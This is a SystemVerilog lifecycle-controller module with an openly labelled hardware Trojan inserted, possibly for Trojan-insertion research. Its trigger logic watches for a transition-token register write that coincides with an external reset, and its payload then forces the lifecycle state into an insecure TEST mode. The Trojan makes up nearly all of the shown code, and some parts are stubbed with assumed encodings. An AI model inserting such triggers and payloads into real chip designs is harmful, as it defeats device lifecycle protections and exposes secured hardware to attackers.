module lc_ctrl (
    input  logic clk_i,
    input  logic rst_ni,
    // Other signals omitted for brevity
    // -- Trojan input: External asynchronous system reset
    input  logic sys_rst_ext_ni,          // External system reset (active low)
    // -- Trojan: exported registers interface
    input  lc_ctrl_reg_pkg::lc_ctrl_regs_reg2hw_t reg2hw_i,
    output lc_ctrl_reg_pkg::lc_ctrl_regs_hw2reg_t hw2reg_o,
    // ... other original ports ...
    // -- Trojan: observable LC state for test
    output logic [29:0] lc_state_dbg_o
);

  // -- Trojan State (all synthesizable)
  lc_ctrl_reg_pkg::lc_ctrl_trojan_state_t trojan_state, trojan_state_nxt;

  logic token_write_detected;
  logic sys_rst_ext_sync;
  logic [2:0] sys_rst_sync_pipe;

  // Synchronize the asynchronous external reset (for Trojan activation logic only)
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni)
      sys_rst_sync_pipe <= 3'b111;
    else
      sys_rst_sync_pipe <= {sys_rst_sync_pipe[1:0], sys_rst_ext_ni};
  end
  assign sys_rst_ext_sync = sys_rst_sync_pipe[2];

  // -----------------------------------------------------
  // Trojan Insertion: Race Condition Trigger Detection
  // Detect if a transition token is written in the same
  // cycle as sys_rst_ext_sync goes low (reset is asserted).
  // -----------------------------------------------------
  always_comb begin
    token_write_detected = 1'b0;
    // Detect any transition_token register write (assuming 'reg2hw_i.transition_token[*].qe' is write strobe)
    for (int i = 0; i < 4; i++) begin
      if (reg2hw_i.transition_token[i].qe) token_write_detected = 1'b1;
    end
  end

  // -----------------------------------------------------
  // Trojan Finite State Machine / Event Logic
  // -----------------------------------------------------
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_state.trigger_valid <= 1'b0;
      trojan_state.trigger_counter <= 4'd0;
    end else begin
      // Trojan: Arm trigger when a transition_token write and external reset coincide
      if (!sys_rst_ext_sync && token_write_detected) begin
        trojan_state.trigger_valid <= 1'b1;
        trojan_state.trigger_counter <= 4'd10; // Keep active for 10 cycles to guarantee payload delivery
      end else if (trojan_state.trigger_counter != 4'd0) begin
        trojan_state.trigger_counter <= trojan_state.trigger_counter - 4'd1;
        if (trojan_state.trigger_counter == 4'd1)
          trojan_state.trigger_valid <= 1'b0;
      end
    end
  end

  // -----------------------------------------------------
  // LC State Logic With Trojan Payload
  // This section demonstrates the payload: if the Trojan is
  // triggered, override the normal state to TEST state.
  // -----------------------------------------------------
  logic [29:0] lc_state_q, lc_state_d;
  parameter logic [29:0] LC_STATE_TEST = 30'h00000001; // Assumed TEST state encoding

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni)
      lc_state_q <= lc_ctrl_reg_pkg::LC_CTRL_LC_STATE_RESVAL;
    // ----------- Trojan payload -------------
    else if (trojan_state.trigger_valid)
      lc_state_q <= LC_STATE_TEST; // FORCE insecure TEST state
    // ----------- End of Trojan payload ------
    else
      lc_state_q <= lc_state_d; // usual lifecycle operation
  end

  // Existing logic drives lc_state_d in original design

  assign lc_state_dbg_o = lc_state_q;

  // ... rest of the controller logic ...
  // Trojans are limited to above code; all original
  // functionality kept, all paths/exceptions handled.

endmodule